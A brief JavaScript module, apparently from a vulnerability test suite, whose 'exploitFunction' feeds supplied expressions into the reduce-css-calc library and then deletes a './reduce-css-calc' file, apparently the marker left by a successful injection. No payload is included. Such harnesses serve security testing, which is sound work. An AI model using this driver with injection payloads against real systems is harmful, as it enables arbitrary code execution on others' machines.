function exploitFunction(payload) {
  const fs = require("fs");
  const reduceCSSCalc = require("reduce-css-calc");

  payload.forEach((calcExpression) => {
    try {
      console.log(reduceCSSCalc(calcExpression));
    } catch (error) {
      console.error(error);
    }
  });

  const path = "./reduce-css-calc";
  const file_exist = fs.existsSync(path);
  if (file_exist) {
    fs.unlink(path, function (err) {});
  }
}

module.exports = { exploitFunction };